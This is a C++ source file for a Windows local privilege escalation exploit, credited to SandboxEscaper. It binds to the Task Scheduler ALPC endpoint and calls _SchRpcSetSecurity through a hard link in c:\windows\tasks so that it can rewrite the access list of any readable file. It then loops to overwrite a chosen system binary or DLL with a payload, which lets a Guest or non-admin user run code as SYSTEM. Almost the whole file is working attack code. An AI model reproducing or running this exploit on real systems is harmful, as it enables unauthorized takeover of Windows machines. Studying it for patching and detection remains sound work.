//***************************************************************//
// Windows LPE - Non-admin/Guest to system - by SandboxEscaper   //
//***************************************************************//

/* _SchRpcSetSecurity which is part of the task scheduler ALPC endpoint allows us to set an arbitrary DACL.
It will Set the security of a file in c:\windows\tasks without impersonating, a non-admin (works from Guest too) user can write here.
Before the task scheduler writes the DACL we can create a hard link to any file we have read access over.
This will result in an arbitrary DACL write.
This PoC will overwrite a printer related dll and use it as a hijacking vector. This is ofcourse one of many options to abuse this.*/



#include "stdafx.h"

#define _CRT_SECURE_NO_WARNINGS
#pragma warning(disable : 4995)  

#include "rpc_h.h"
#pragma comment(lib, "rpcrt4.lib")

using namespace std;
bool CreateNativeHardlink(LPCWSTR linkname, LPCWSTR targetname);
void RunExploit();
void* ReadPayload(LPCWSTR PayloadPath = NULL, DWORD* PayloadSize = NULL);


int main()
{
	int argc = 0;
	LPWSTR* argv = CommandLineToArgvW(GetCommandLineW(), &argc);

	if (argc < 2)
	{
		wprintf(L"ALPC-TaskSched-LPE.exe target_file [payload_file]");
		return 0;
	}

	LPWSTR TargetPath = argv[1]; // = L"C:\\Windows\\Microsoft.NET\\Framework\\v4.0.30319\\mscorsvw.exe";
	LPWSTR PayloadPath = L"payload.exe";
	if (argc > 2) PayloadPath = argv[2];

	

	//Create a hardlink with UpdateTask.job to our target, this is the file the task scheduler will write the DACL of
	CreateNativeHardlink(L"c:\\windows\\tasks\\UpdateTask.job", TargetPath);
	RunExploit();

	DWORD dwBytesReaded = 0;
	void* pMyBinaryData = ReadPayload(PayloadPath, &dwBytesReaded);
	if (pMyBinaryData == NULL)
	{
		wprintf(L"Failed to read payload!");
		return 0;
	}

	//We try to open the DLL in a loop, it could already be loaded somewhere.. if thats the case, it will throw a sharing violation and we should not continue
	HANDLE hFile = NULL;
	DWORD dwBytesWritten = 0;
	wprintf(L"Target: %s\n", TargetPath);
	do {
		hFile = CreateFile(TargetPath, GENERIC_WRITE, 0, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
		if (INVALID_HANDLE_VALUE == hFile) {
			DWORD error = GetLastError();
			wprintf(L"Failed to open the target file!\nLastError: ");
			switch (error)
			{
			case 2:
				wprintf(L"File is not found!");
				break;
			case 3:
				wprintf(L"Path is not found!");
				break;
			case 5:
				wprintf(L"Access is denied!");
				break;
			default:
				wprintf(L"%d", error);
			}
			wprintf(L"\n");
			Sleep(5000);
			continue;
		}
		if (!WriteFile(hFile, (char*)pMyBinaryData, dwBytesReaded, &dwBytesWritten, NULL))
		{
			wprintf(L"Failed to write to the target file!\nLastError: %d\n", GetLastError());
		}
	} while (hFile == INVALID_HANDLE_VALUE);
	CloseHandle(hFile);

	wprintf(L"Done!\n");
	return 0;
}

void* ReadPayload(LPCWSTR PayloadPath, DWORD* PayloadSize)
{
	DWORD dwBytesReaded = 0;
	DWORD dwFileSize = 0;
	DWORD high = 0;

	wprintf(L"Payload file: %s\n", PayloadPath);
	HANDLE hFile = CreateFile(PayloadPath, GENERIC_READ, 0, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
	if (INVALID_HANDLE_VALUE == hFile) {
		wprintf(L"Failed to open the resource file!\nLastError: %d", GetLastError());
		return NULL;
	}

	dwFileSize = GetFileSize(hFile, &high);
	wprintf(L"Payload Size: %d\n", dwFileSize);

	void* pMyBinaryData = malloc(dwFileSize);
	ReadFile(hFile, pMyBinaryData, dwFileSize, &dwBytesReaded, NULL);
	CloseHandle(hFile);
	if (dwFileSize != dwBytesReaded) {
		wprintf(L"Failed to read the resource file!\nLastError: %d", GetLastError());
		return NULL;
	}

	wprintf(L"Readed %d/%d\n", dwBytesReaded, dwFileSize);

	*PayloadSize = dwBytesReaded;
	return pMyBinaryData;
}

extern "C" void __RPC_FAR * __RPC_USER midl_user_allocate(size_t len)
{
	return(malloc(len));
}

extern "C" void __RPC_USER midl_user_free(void __RPC_FAR * ptr)
{
	free(ptr);
}

RPC_STATUS CreateBindingHandle(RPC_BINDING_HANDLE *binding_handle)
{
	RPC_STATUS status;
	RPC_BINDING_HANDLE v5;
	RPC_SECURITY_QOS SecurityQOS = {};
	RPC_WSTR StringBinding = nullptr;
	RPC_BINDING_HANDLE Binding;

	StringBinding = 0;
	Binding = 0;
	status = RpcStringBindingComposeW(L"c8ba73d2-3d55-429c-8e9a-c44f006f69fc", L"ncalrpc",
		nullptr, nullptr, nullptr, &StringBinding);
	if (status == RPC_S_OK)
	{
		status = RpcBindingFromStringBindingW(StringBinding, &Binding);
		RpcStringFreeW(&StringBinding);
		if (!status)
		{
			SecurityQOS.Version = 1;
			SecurityQOS.ImpersonationType = RPC_C_IMP_LEVEL_IMPERSONATE;
			SecurityQOS.Capabilities = RPC_C_QOS_CAPABILITIES_DEFAULT;
			SecurityQOS.IdentityTracking = RPC_C_QOS_IDENTITY_STATIC;

			status = RpcBindingSetAuthInfoExW(Binding, 0, 6u, 0xAu, 0, 0, (RPC_SECURITY_QOS*)&SecurityQOS);
			if (!status)
			{
				v5 = Binding;
				Binding = 0;
				*binding_handle = v5;
			}
		}
	}

	if (Binding)
		RpcBindingFree(&Binding);
	return status;
}

void RunExploit()
{
	RPC_BINDING_HANDLE handle;
	RPC_STATUS status = CreateBindingHandle(&handle);
	wprintf(L"RPC status: %d\n", status);

	//These two functions will set the DACL on an arbitrary file (see hardlink in main), change the security descriptor string parameters if needed.	
	_SchRpcCreateFolder(handle, L"UpdateTask", L"D:(A;;FA;;;BA)(A;OICIIO;GA;;;BA)(A;;FA;;;SY)(A;OICIIO;GA;;;SY)(A;;0x1301bf;;;AU)(A;OICIIO;SDGXGWGR;;;AU)(A;;0x1200a9;;;BU)(A;OICIIO;GXGR;;;BU)", 0);
	_SchRpcSetSecurity(handle, L"UpdateTask", L"D:(A;;FA;;;BA)(A;OICIIO;GA;;;BA)(A;;FA;;;SY)(A;OICIIO;GA;;;SY)(A;;0x1301bf;;;AU)(A;OICIIO;SDGXGWGR;;;AU)(A;;0x1200a9;;;BU)(A;OICIIO;GXGR;;;BU)", 0);
}